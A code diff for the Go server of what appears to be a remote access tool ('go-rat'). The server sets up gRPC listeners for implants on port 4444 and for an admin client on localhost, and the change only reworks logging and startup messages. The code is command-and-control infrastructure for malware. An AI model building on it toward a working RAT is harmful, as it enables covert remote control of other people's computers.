@@ -4,9 +4,9 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"github.com/charmbracelet/log"
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
-	"log"
 	"net"
 )
 
@@ -76,21 +76,16 @@ func main() {
 	implant_addr := ":4444"
 	if implantListener, err = net.Listen("tcp", implant_addr); err != nil {
 		log.Print(implantListener)
-		log.Print("Error en el listener del implant")
-		log.Fatal(err)
+		log.Fatal("Error en el listener del implant", "ERROR", err)
 	}
 
 	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
 		log.Print(adminListener)
-		log.Print("Error en el listener del admin")
-		log.Fatal(err)
+		log.Fatal("Error en el listener del admin", "ERROR", err)
 	}
 
-	if adminListener != nil && implantListener != nil {
-		log.Printf("[*] Client listening at %s.\n", client_addr)
-		log.Printf("[*] Implant listening at %s.\n", implant_addr)
-	} else {
-		log.Fatal("Could not listen.")
+	if adminListener == nil || implantListener == nil {
+		log.Fatal("[!] No se puede escuchar.", "ERROR", "Los listeners son nil!!!")
 	}
 
 	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
@@ -103,11 +98,13 @@ func main() {
 	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
 	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
 	go func() {
+		log.Infof("[+] ImplantListener escuchando en %s", implant_addr)
 		err = grpcImplantServer.Serve(implantListener)
 		if err != nil {
 			log.Fatal(err)
 		}
 	}()
+	log.Infof("[+] AdminListener escuchando en %s", client_addr)
 	err = grpcAdminServer.Serve(adminListener)
 	if err != nil {
 		log.Fatal(err)
